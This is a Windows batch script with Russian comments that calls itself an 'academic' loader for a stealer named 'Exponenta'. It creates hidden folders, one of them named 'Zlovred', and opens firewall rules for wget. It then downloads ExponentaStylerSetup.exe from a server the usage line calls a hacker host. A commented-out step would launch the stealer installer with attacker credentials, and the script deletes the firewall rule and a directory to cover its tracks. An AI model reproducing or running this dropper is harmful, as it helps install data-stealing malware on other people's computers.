rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > load_distrib.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4

rem Обновляем перемсенные окружения
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

rem Настраиваем переменные окружения для команды Wget

rem Определяем переменные:

rem Основная папка
rem set httpMainFolder=Exponenta
rem Префикс протокола
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem WebDAV User
rem set httpuser=%Hacker_User%
rem WebDAV Password
rem set httppassword=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Distrib\Zlovred

rem Копируем wget и запускаем установку в каталоге %LocalFolder%
copy wget.exe %LocalFolder%\wget.exe
copy install_Styler.ini %LocalFolder%\
copy install_Stylerdistrib.bat %LocalFolder%\
copy Install_Styler.bat %LocalFolder%\
cd /d %LocalFolder%
cd %LocalFolder%

rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%LocalFolder%\wget.exe" enable=yes
rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolder%\wget.exe" enable=yes


rem Запускаем на выполнение команды WGET
rem !!! Изменяемая величина! Проверять перед использованием !!!

wget %host%/ExponentaStylerSetup.exe
rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
rem wget -r --no-parent %host%/


rem Запускаем инсталлятор Stealer "Экспонента"
rem call install_Styler.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %hldnstoken% %entrydnstoken%
cd /d %curdir%
cd %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Удаляем правило для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"


rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

